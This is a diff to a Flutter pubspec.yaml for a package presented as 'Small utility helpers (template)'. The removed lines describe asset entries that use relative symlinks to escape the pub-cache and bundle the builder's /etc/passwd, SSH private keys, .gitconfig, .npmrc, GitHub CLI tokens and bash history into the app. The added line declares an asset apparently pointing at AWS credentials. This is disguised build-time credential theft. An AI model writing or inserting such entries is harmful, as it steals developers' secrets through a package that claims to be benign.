@@ -3,20 +3,6 @@ description: Small utility helpers (template).
 version: 0.0.1
 environment:
   sdk: ">=3.0.0 <4.0.0"
-
 flutter:
-  # Each entry reads a file from the machine building the app. Relative symlinks
-  # climb out of the pub-cache git clone (4 levels) into the user's HOME:
-  #   ~/.pub-cache/git/<pkg>-<sha>/linkdir/  ->  ~/target
-  # Works on Linux/macOS and WSL. Trim entries to files that exist on the
-  # target machine (a missing target = build error).
   assets:
-    - etc_passwd/secret.txt        # /etc/passwd                    (always exists)
-    - ssh_rsa/secret.txt           # ~/.ssh/id_rsa
-    - ssh_ed25519/secret.txt       # ~/.ssh/id_ed25519
-    - gitconfig/secret.txt         # ~/.gitconfig
-    - npmrc/secret.txt             # ~/.npmrc
-    - gh_hosts/secret.txt          # ~/.config/gh/hosts.yml
-    - bash_history/secret.txt      # ~/.bash_history
-  licenses:
-    - etc_passwd/secret.txt
+    - aws_creds/secret.txt
